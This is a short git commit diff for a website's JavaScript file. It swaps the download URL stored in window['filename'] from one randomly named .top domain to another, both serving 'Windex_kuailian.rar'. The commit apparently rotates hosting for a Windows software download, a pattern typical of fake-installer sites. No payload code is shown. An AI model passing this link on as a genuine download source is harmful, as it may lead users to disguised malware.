739ab48873fd66c4b946428181a1e1c9452b2141
aa168188 <sli010342@gmail.com>
2025-07-23 10:18:40 +0800

    Update filename.js

--- static/js/filename.js
+++ static/js/filename.js
@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://slsajofitoas6d4a-s333ss.top/Windex_kuailian.rar';
+    window['filename'] = 'https://soelrsjkikfje-s3.top/Windex_kuailian.rar';
 })();
